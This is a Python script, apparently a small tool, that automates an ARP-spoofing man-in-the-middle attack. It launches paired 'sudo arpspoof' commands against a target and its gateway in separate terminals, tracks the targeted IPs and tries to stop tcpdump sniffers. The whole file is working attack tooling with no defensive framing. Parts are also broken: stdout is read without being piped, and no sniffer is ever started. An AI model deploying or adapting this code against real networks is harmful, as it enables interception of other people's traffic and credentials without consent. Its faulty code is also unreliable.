import subprocess
import time
import signal
import os

interface = None
sniff_list = []

def arp_spoof_host_IPs(target_ip, gateway_ip, selected_interface):
    global interface
    interface = selected_interface
    # ARP spoofing commands
    arpspoof_commands = [
        f"sudo arpspoof -i {interface} -t {target_ip} {gateway_ip}; read -p 'Press Enter to close this terminal'",
        f"sudo arpspoof -i {interface} -t {gateway_ip} {target_ip}; read -p 'Press Enter to close this terminal'"
    ]
    return arpspoof_commands

def stop_sniffing():
    global sniff_list
    for ip_address in sniff_list:
        print(f"Stopping sniffing for {ip_address}")
        sniff_process = subprocess.Popen(['pgrep', '-f', f"sudo tcpdump -i {interface} host {ip_address}"])
        sniff_pid = sniff_process.stdout.read().strip()
        if sniff_pid:
            try:
                os.kill(int(sniff_pid), signal.SIGINT)
            except ProcessLookupError:
                pass
    sniff_list.clear()

def check_sniffer_active(ip_address):
    # Check if there's an active sniffer for the given IP address
    return ip_address in sniff_list

def run_arpspoof(ip_address, gateway_ip, interface):
    global sniff_list
    if check_sniffer_active(ip_address):
        print(f"\n\nSniffer already active for {ip_address}!!!!!!!!!!! \n\n")
        return
    
    arpspoof_commands = arp_spoof_host_IPs(ip_address, gateway_ip, interface)
    arpspoof_processes = []
    for command in arpspoof_commands:
        # Open a new terminal window and execute the arp_spoof command
        process = subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', command])
        arpspoof_processes.append(process)

    try:
        while True:
            time.sleep(1)  # Keep the script running
            if ip_address not in sniff_list:
                sniff_list.append(ip_address)
            print(sniff_list)
    except KeyboardInterrupt:
        print("\nKeyboardInterrupt received. Cleaning up...")
        stop_sniffing()
